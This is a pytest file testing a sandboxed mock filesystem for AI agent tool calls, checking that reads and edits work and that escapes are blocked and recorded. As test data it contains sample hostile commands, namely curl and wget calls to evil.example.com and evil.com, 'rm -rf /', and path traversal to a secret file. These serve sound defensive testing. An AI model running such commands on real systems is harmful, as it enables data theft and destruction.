"""Tests for QO-053-B MockFileSystem.

Each tool has a happy-path test plus a sandbox-escape attempt that must be
recorded but blocked.
"""
from __future__ import annotations

from pathlib import Path

import pytest

from src.core.mock_filesystem import MockFileSystem


@pytest.fixture
def skill_dir(tmp_path: Path) -> Path:
    """Pin a tiny fixture skill directory under ``tmp_path``."""
    root = tmp_path / "skill_solana_swap"
    root.mkdir()
    (root / "SKILL.md").write_text("---\nname: solana-swap\n---\nbody")
    (root / "examples").mkdir()
    (root / "examples" / "swap.ts").write_text(
        "// swap.ts: example Solana swap\nexport const route = 'jupiter';\n"
    )
    (root / "scripts").mkdir()
    (root / "scripts" / "run.sh").write_text("#!/bin/bash\necho hello")
    # An "outside" file the sandbox must never read.
    (tmp_path / "secret.txt").write_text("DO NOT EXFIL")
    return root


# ── Read ────────────────────────────────────────────────────────────────────


class TestRead:
    def test_happy_path(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Read("examples/swap.ts")
        assert call.tool == "Read"
        assert call.error is None
        assert "swap.ts: example Solana swap" in call.returned

    def test_path_escape_blocked(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Read("../secret.txt")
        assert call.blocked is True
        assert call.returned is None
        assert "outside skill directory" in call.error

    def test_absolute_path_escape_blocked(self, skill_dir, tmp_path):
        fs = MockFileSystem(skill_dir)
        call = fs.Read(str(tmp_path / "secret.txt"))
        assert call.blocked is True

    def test_directory_returns_error(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Read("examples")
        assert "directory" in call.error

    def test_missing_file(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Read("examples/missing.ts")
        assert "404" in call.error


# ── Bash ────────────────────────────────────────────────────────────────────


class TestBash:
    def test_ls_happy(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("ls examples")
        assert call.error is None
        assert "swap.ts" in call.returned

    def test_cat_happy(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("cat examples/swap.ts")
        assert call.error is None
        assert "swap.ts: example" in call.returned

    def test_head(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("head examples/swap.ts")
        assert call.error is None

    def test_git_log_canned(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("git log --oneline -3")
        assert "deadbeef" in call.returned

    def test_curl_blocked(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("curl https://evil.example.com/steal")
        assert call.blocked is True
        assert "network" in call.error
        # Recorded for downstream probes
        assert len(fs.network_attempts()) == 1

    def test_wget_blocked(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("wget http://evil.com")
        assert call.blocked is True

    def test_unsafe_command_recorded(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash("rm -rf /")
        assert call.blocked is True
        assert call.error.startswith("sandbox-error")

    def test_path_escape_in_ls_blocked(self, skill_dir, tmp_path):
        fs = MockFileSystem(skill_dir)
        call = fs.Bash(f"ls {tmp_path}")
        assert call.blocked is True


# ── Glob ────────────────────────────────────────────────────────────────────


class TestGlob:
    def test_glob_finds(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Glob("examples/*.ts")
        assert "examples/swap.ts" in call.returned

    def test_dotdot_pattern_blocked(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Glob("../*.txt")
        assert call.blocked is True

    def test_empty_pattern(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Glob("")
        assert call.error == "empty-pattern"


# ── Grep ────────────────────────────────────────────────────────────────────


class TestGrep:
    def test_grep_finds(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Grep("jupiter")
        assert "swap.ts" in call.returned

    def test_grep_outside_dir_blocked(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Grep("hello", path="../")
        assert call.blocked is True

    def test_invalid_regex(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Grep("(unclosed")
        assert call.error.startswith("invalid-regex")


# ── Edit ────────────────────────────────────────────────────────────────────


class TestEdit:
    def test_edit_overlay_only(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Edit("examples/swap.ts", "jupiter", "raydium")
        assert call.error is None
        # Re-read sees overlay
        re_read = fs.Read("examples/swap.ts")
        assert "raydium" in re_read.returned
        assert "jupiter" not in re_read.returned
        # On-disk content is unchanged
        on_disk = (skill_dir / "examples" / "swap.ts").read_text()
        assert "jupiter" in on_disk

    def test_edit_old_not_found(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Edit("examples/swap.ts", "NOT-PRESENT", "x")
        assert call.error == "old-string-not-found"

    def test_edit_path_escape(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Edit("../secret.txt", "DO", "OK")
        assert call.blocked is True


# ── Write ───────────────────────────────────────────────────────────────────


class TestWrite:
    def test_write_overlay(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Write("notes.md", "hello world")
        assert call.error is None
        re_read = fs.Read("notes.md")
        assert re_read.returned == "hello world"
        # Not on disk
        assert not (skill_dir / "notes.md").exists()

    def test_write_path_escape(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        call = fs.Write("../pwn.txt", "x")
        assert call.blocked is True


# ── Logging ─────────────────────────────────────────────────────────────────


class TestLog:
    def test_calls_recorded(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        fs.Read("examples/swap.ts")
        fs.Bash("curl x")
        fs.Glob("**/*.sh")
        assert len(fs.tool_calls_log) == 3
        assert fs.tool_calls_log[0].tool == "Read"
        assert fs.tool_calls_log[1].blocked is True

    def test_reset_log(self, skill_dir):
        fs = MockFileSystem(skill_dir)
        fs.Read("examples/swap.ts")
        fs.reset_log()
        assert fs.tool_calls_log == []
